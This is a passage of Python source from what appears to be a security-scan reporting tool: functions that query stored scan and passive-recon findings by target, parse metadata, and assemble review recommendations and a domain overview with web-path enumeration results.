    if not hasattr(connection, "execute"):
        return []
    pattern = f"%{target}%"
    rows = connection.execute(
        """
        SELECT sr.tool_name, sf.finding_type, sf.key, sf.value, sf.category, sf.risk_score, sf.metadata_json
        FROM scan_findings sf
        JOIN scan_runs sr ON sr.id = sf.scan_run_id
        WHERE sr.target LIKE ?
           OR sf.key LIKE ?
           OR sf.value LIKE ?
           OR sf.metadata_json LIKE ?
        ORDER BY sf.id DESC
        LIMIT 5000
        """,
        (pattern, pattern, pattern, pattern),
    ).fetchall()
    return [dict(row) for row in rows]


def _query_passive_recon_results(connection, target: str) -> list[dict[str, object]]:
    if not hasattr(connection, "execute"):
        return []
    pattern = f"%{target}%"
    rows = connection.execute(
        """
        SELECT sf.finding_type, sf.key, sf.value, sf.metadata_json
        FROM scan_findings sf
        JOIN scan_runs sr ON sr.id = sf.scan_run_id
        WHERE sr.tool_name = 'passive_recon'
          AND sr.target LIKE ?
        ORDER BY sf.id DESC
        """,
        (pattern,),
    ).fetchall()
    return [dict(row) for row in rows]


def _build_report_recommendations(
    overview: dict[str, object],
    checklist_items: list[dict[str, object]],
    highest_risk: int,
) -> list[str]:
    recommendations = [
        f"Prioritize manual review for the highest observed risk score ({highest_risk}).",
        "Confirm exposed services and sensitive paths against the stored evidence before any follow-up testing.",
        "Preserve artifacts from Findings.md, Sensitive-Paths.md, and Review-Summary.md for reporting.",
    ]
    pending = [item for item in checklist_items if str(item.get("status", "todo")) != "done"]
    if pending:
        recommendations.append(f"Complete remaining MAGI checklist items: {len(pending)} still not marked done.")
    reviews = overview.get("reviews", [])
    if reviews:
        top_titles = [str(item.get("title") or item.get("finding_key") or "").strip() for item in reviews[:3] if isinstance(item, dict)]
        recommendations.append(f"Top review signals: {', '.join(title for title in top_titles if title)}")
    return recommendations


def _load_metadata_json(value: object) -> dict[str, object]:
    if not value:
        return {}
    try:
        data = json.loads(str(value))
    except (TypeError, json.JSONDecodeError):
        return {}
    return data if isinstance(data, dict) else {}


def _safe_domain_overview(connection, target: str, *, limit: int) -> dict[str, object]:
    if not hasattr(connection, "execute"):
        return {
            "inventory": [],
            "reviews": [],
            "angel_eyes": {"items": [], "grouped": {}},
            "web_paths": {"ffuf": [], "katana": [], "gobuster": []},
        }
    return domain_overview(connection, target, limit=limit)


def _safe_checklist_items(connection) -> list[dict[str, object]]:
    if not hasattr(connection, "execute"):
        return []
    return [dict(item) for item in list_checklist_items(connection)]
